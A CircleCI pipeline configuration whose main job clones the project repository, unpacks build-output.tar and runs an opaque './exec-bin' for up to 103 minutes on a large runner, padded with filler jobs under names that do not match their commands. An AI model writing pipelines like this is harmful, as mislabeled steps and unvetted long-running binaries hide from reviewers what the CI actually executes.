version: 2.1

jobs:
  warmup_produce-production-artifact-bundle:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Materialize sort order
          command: |
            mkdir -p /tmp/pipeline
            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 397369 | md5sum; true ; } > /tmp/pipeline/step-27.txt
            echo "gate produce-production-artifact-bundle: $(wc -c </tmp/pipeline/step-27.txt) bytes total"
      - persist_to_workspace:
          root: /tmp/pipeline
          paths:
            - step-27.txt
  produce-production-artifact-bundle:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/pipeline
      - run:
          name: Peek upstream
          command: |
            cat /tmp/pipeline/step-27.txt
      - run:
          name: Fetch artifact
          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore inputs
          command: tar xf build-output.tar
      - run:
          name: Record build info
          command: /bin/sleep 30
      - run:
          command: uname -a
      - run:
          command: du -sh .
      - run:
          no_output_timeout: 103m
          command: /bin/bash -c "./exec-bin"
  teardown_alpha:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/pipeline
      - run:
          name: Shape kernel ring
          command: |
            mkdir -p /tmp/pipeline
            { set +o pipefail 2>/dev/null; seq 2 19138 | factor | wc -l; true ; } > /tmp/pipeline/465b.txt
            echo "gate alpha: $(wc -c </tmp/pipeline/465b.txt) bytes total"
      - persist_to_workspace:
          root: /tmp/pipeline
          paths:
            - 465b.txt
